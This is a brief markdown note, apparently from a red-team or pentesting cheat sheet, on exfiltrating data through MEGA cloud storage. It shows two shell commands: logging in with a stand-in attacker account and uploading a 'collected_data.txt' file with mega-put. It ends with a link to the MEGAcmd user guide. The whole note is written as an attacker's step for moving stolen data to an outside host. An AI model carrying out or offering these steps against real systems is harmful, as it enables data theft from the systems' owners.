# Send Data via MEGA

Attackers also leverage MEGA cloud storage to exfiltrate collected data.

## 1. Login

```sh
mega-login "attacker@example.com"
# Password prompt opens... 
```

## 2. Send Data to MEGA

```sh
# mega-put <src> <dest>
mega-put ./collected_data.txt data/
```

## Resources

- [MEGA CMD User Guide](https://github.com/meganz/MEGAcmd/blob/master/UserGuide.md)